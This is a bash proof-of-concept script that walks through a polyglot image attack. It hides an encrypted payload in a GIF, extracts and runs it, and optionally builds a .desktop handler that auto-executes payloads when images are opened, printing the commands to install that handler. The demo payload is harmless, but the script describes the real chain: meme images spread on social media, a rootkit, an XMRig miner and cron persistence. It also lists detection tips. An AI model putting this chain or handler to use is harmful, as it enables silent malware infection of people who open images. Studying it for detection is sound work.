#!/bin/bash
#
# Complete Polyglot Attack Demonstration
# =======================================
# End-to-end PoC showing the entire attack chain
#
# Author: SWORDIntel
# Date: 2025-11-08
#

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "========================================="
echo "  POLYGLOT IMAGE ATTACK - FULL DEMO"
echo "========================================="
echo ""
echo "This demonstration shows the complete attack chain:"
echo "  1. Create harmless test payload"
echo "  2. Embed payload into image (polyglot creation)"
echo "  3. Verify image still displays normally"
echo "  4. Extract and execute payload"
echo "  5. (Optional) Generate auto-execution .desktop file"
echo ""
read -p "Press ENTER to continue..."

# Step 1: Create test payload
echo ""
echo "[Step 1/5] Creating test payload..."
echo "======================================"

TEST_PAYLOAD="test_payloads/info_gather.sh"
if [ ! -f "$TEST_PAYLOAD" ]; then
    echo "[!] Test payload not found, using inline version"
    mkdir -p test_payloads
    cat > "$TEST_PAYLOAD" << 'EOF'
#!/bin/bash
echo "[+] PoC PAYLOAD EXECUTED!"
echo "[+] Timestamp: $(date)"
echo "[+] Host: $(hostname)"
echo "[+] User: $(whoami)"
echo "[+] This would be the cryptd rootkit + XMRig miner!"
EOF
    chmod +x "$TEST_PAYLOAD"
fi

echo "[+] Test payload created: $TEST_PAYLOAD"
echo "    Contents:"
head -5 "$TEST_PAYLOAD" | sed 's/^/    /'
echo ""
read -p "Press ENTER to continue..."

# Step 2: Find or create test image
echo ""
echo "[Step 2/5] Preparing test image..."
echo "======================================"

# Try to find an existing image
TEST_IMAGE=""
for img in ../Payloads2/*.gif ../Payloads2/*.png ../Payloads2/*.jpg; do
    if [ -f "$img" ]; then
        TEST_IMAGE="$img"
        break
    fi
done

if [ -z "$TEST_IMAGE" ]; then
    # Create a simple test GIF
    echo "[*] No existing image found, creating test image..."
    TEST_IMAGE="test_image.gif"

    # Create 1x1 transparent GIF
    python3 << 'EOF'
# Minimal valid GIF file
gif_data = (
    b'GIF89a'  # Header
    b'\x01\x00\x01\x00'  # 1x1 canvas
    b'\x80\x00\x00'  # Global color table flag
    b'\x00\x00\x00'  # Black
    b'\xff\xff\xff'  # White
    b'\x21\xf9\x04\x01\x00\x00\x00\x00'  # Graphics control
    b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'  # Image descriptor
    b'\x02\x02\x44\x01\x00'  # Image data
    b'\x3b'  # GIF trailer (EOF)
)
with open('test_image.gif', 'wb') as f:
    f.write(gif_data)
print("[+] Created minimal test GIF")
EOF
else
    echo "[+] Using existing image: $TEST_IMAGE"
    # Copy it to local directory
    cp "$TEST_IMAGE" test_image.gif
    TEST_IMAGE="test_image.gif"
fi

echo "[+] Test image ready: $TEST_IMAGE"
file "$TEST_IMAGE"
echo ""
read -p "Press ENTER to continue..."

# Step 3: Embed payload into image
echo ""
echo "[Step 3/5] Creating polyglot image..."
echo "======================================"

POLYGLOT_IMAGE="infected_meme.gif"

python3 polyglot_embed.py \
    "$TEST_IMAGE" \
    "$TEST_PAYLOAD" \
    "$POLYGLOT_IMAGE" \
    -k 9e \
    -k 0a61200d \
    -v

echo ""
echo "[+] Polyglot image created!"
echo "[*] Verifying image format..."
file "$POLYGLOT_IMAGE"

echo ""
echo "[*] Checking if image still displays..."
if command -v eog &>/dev/null; then
    echo "[*] Opening with Eye of GNOME (will close in 3 seconds)..."
    timeout 3 eog "$POLYGLOT_IMAGE" 2>/dev/null || true
    echo "[+] Image displayed successfully!"
elif command -v display &>/dev/null; then
    echo "[*] Opening with ImageMagick..."
    timeout 3 display "$POLYGLOT_IMAGE" 2>/dev/null || true
    echo "[+] Image displayed successfully!"
else
    echo "[!] No image viewer found, but polyglot should display normally"
fi

echo ""
read -p "Press ENTER to continue..."

# Step 4: Extract and execute payload
echo ""
echo "[Step 4/5] Extracting and executing payload..."
echo "================================================"

echo "[*] Extracting encrypted payload from image..."
python3 polyglot_extract.py \
    "$POLYGLOT_IMAGE" \
    -k 9e \
    -k 0a61200d \
    -v

EXTRACTED_PAYLOAD=$(ls *_extracted_payload.bin 2>/dev/null | head -1)

if [ -f "$EXTRACTED_PAYLOAD" ]; then
    echo ""
    echo "[+] Payload extracted: $EXTRACTED_PAYLOAD"
    echo "[*] Verifying it matches original..."

    if diff -q "$TEST_PAYLOAD" "$EXTRACTED_PAYLOAD" > /dev/null 2>&1; then
        echo "[+] SUCCESS! Extracted payload matches original!"
    else
        echo "[!] WARNING: Extracted payload differs from original"
        echo "    This might be normal if the payload was compressed/modified"
    fi

    echo ""
    echo "[*] Executing extracted payload..."
    echo "===================================="
    chmod +x "$EXTRACTED_PAYLOAD"
    bash "$EXTRACTED_PAYLOAD"
    echo "===================================="
else
    echo "[!] Extraction failed!"
    exit 1
fi

echo ""
read -p "Press ENTER to continue..."

# Step 5: Optional .desktop file generation
echo ""
echo "[Step 5/5] Auto-execution setup (OPTIONAL)"
echo "============================================"
echo ""
echo "This step demonstrates how to create a .desktop file"
echo "that would auto-execute payloads when images are opened."
echo ""
echo "[!] WARNING: Do NOT install this on a production system!"
echo ""
read -p "Generate .desktop file? (y/N): " -n 1 -r
echo

if [[ $REPLY =~ ^[Yy]$ ]]; then
    python3 desktop_generator.py \
        -e "$(pwd)/polyglot_extract.py" \
        -o polyglot_handler.desktop \
        -t simple \
        -k 9e \
        -k 0a61200d

    echo ""
    echo "[+] Desktop file created: polyglot_handler.desktop"
    echo ""
    echo "To install (DANGEROUS - research only!):"
    echo "  cp polyglot_handler.desktop ~/.local/share/applications/"
    echo "  update-desktop-database ~/.local/share/applications"
    echo ""
    echo "To remove:"
    echo "  rm ~/.local/share/applications/polyglot_handler.desktop"
    echo "  update-desktop-database ~/.local/share/applications"
else
    echo "[*] Skipped .desktop file generation"
fi

# Summary
echo ""
echo "========================================="
echo "  DEMONSTRATION COMPLETE!"
echo "========================================="
echo ""
echo "Summary of what was demonstrated:"
echo "  ✓ Created harmless test payload (info_gather.sh)"
echo "  ✓ Embedded encrypted payload into image"
echo "  ✓ Verified image still displays normally"
echo "  ✓ Extracted and decrypted payload"
echo "  ✓ Executed payload (harmless PoC)"
echo ""
echo "Files created:"
echo "  - $POLYGLOT_IMAGE (polyglot image)"
echo "  - $EXTRACTED_PAYLOAD (extracted payload)"
if [ -f "polyglot_handler.desktop" ]; then
    echo "  - polyglot_handler.desktop (auto-executor)"
fi
echo ""
echo "In a real attack scenario:"
echo "  1. Attacker creates polyglot meme images"
echo "  2. Distributes them on social media/forums"
echo "  3. Victims download and open images"
echo "  4. Payloads auto-execute via .desktop handler"
echo "  5. cryptd rootkit disables security"
echo "  6. XMRig miner starts mining cryptocurrency"
echo "  7. Persistence via cron + immutable files"
echo ""
echo "Detection methods:"
echo "  - Check for data after image EOF markers"
echo "  - Monitor for suspicious .desktop files"
echo "  - Watch for XMRig/mining pool connections"
echo "  - Audit cron jobs for immutable entries"
echo ""
echo "========================================="
